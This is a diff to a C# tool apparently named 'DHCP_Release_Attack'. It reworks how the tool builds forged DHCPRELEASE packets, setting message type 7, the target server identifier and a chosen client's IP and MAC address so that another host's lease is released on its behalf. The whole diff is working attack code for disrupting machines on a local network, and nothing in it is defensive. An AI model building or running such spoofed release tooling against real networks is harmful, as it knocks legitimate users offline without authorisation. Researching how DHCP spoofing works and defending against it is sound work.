@@ -1,8 +1,10 @@
-﻿using PacketDotNet;
+﻿using DhcpDotNet;
+using PacketDotNet;
 using SharpPcap;
 using SharpPcap.LibPcap;
 using SharpPcap.Npcap;
 using System;
+using System.Linq;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Threading;
@@ -123,14 +125,36 @@ namespace DHCP_Release_Attack
             byte[] _transactionID = new byte[4];
             rand.NextBytes(_transactionID);
 
-            DhcpReleasePacket dhcpReleasePacket = new DhcpReleasePacket()
+            DhcpOption dhcpMessageTypeOption = new DhcpOption()
+            {
+                optionId = dhcpOptionIds.DhcpMessageType,
+                optionLength = new byte[] { 0x01 },
+                optionValue = new byte[] { 0x07 },
+            };
+
+            DhcpOption dhcpServerIdOption = new DhcpOption()
+            {
+                optionId = dhcpOptionIds.ServerIdentifier,
+                optionLength = new byte[] { 0x04 },
+                optionValue = pDestinationIpAddress.GetAddressBytes(),
+            };
+
+            DhcpOption clientIdOption = new DhcpOption()
+            {
+                optionId = dhcpOptionIds.ClientIdentifier,
+                optionLength = new byte[] { 0x04 },
+                optionValue = pClientIpAddress.GetAddressBytes(),
+            };
+
+            byte[] options = dhcpMessageTypeOption.buildDhcpOption().Concat(dhcpServerIdOption.buildDhcpOption()).Concat(clientIdOption.buildDhcpOption()).ToArray();
+
+            DhcpPacket dhcpReleasePacket = new DhcpPacket()
             {
                 transactionID = _transactionID,
                 clientIP = pClientIpAddress.GetAddressBytes(),
                 clientMac = pClientHwAddress.GetAddressBytes(),
 
-                dhcpServIdValue = pDestinationIpAddress.GetAddressBytes(),
-                clientIdValue = pClientHwAddress.GetAddressBytes(),
+                dhcpOptions = options,
             };
 
             return dhcpReleasePacket.buildPacket();
